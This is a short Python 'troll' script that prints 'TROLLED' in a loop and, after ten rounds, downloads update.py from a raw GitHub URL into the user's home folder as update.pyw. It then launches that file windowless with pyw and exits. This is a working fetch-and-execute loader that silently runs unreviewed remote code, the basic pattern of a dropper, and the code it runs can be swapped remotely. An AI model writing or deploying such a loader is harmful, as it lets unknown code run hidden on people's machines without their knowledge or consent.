# Runs the troll scripts and updates its-self
import os, urllib.request, pathlib, time, subprocess, random
def main():
    def sleep(Time):
        time.sleep(Time)
    V = 0
    while 0 != 1:
        
        def updater():
            home = os.path.expanduser("~")
            os.chdir(home)
            dlurl = "https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py"
            path = str(home) + "/update.pyw"
            try:
                os.remove('update.pyw')
            except FileNotFoundError:
                print('Its Not Here')
            urllib.request.urlretrieve(dlurl, '{}'.format(path))
            #os.system("start cmd /c {}".format('pyw ' + path))
            sleep(.2)
            subprocess.Popen(['pyw', 'update.pyw'])
            exit()


        def trolls():
            print('TROLLED')

        def rnumg():
            T = random.randint(0,2)
            return T

        if V == 10:
            updater()
        else:
            trolls()
            Time = rnumg()
            sleep(Time)
            V += 1
            print(V)
main()
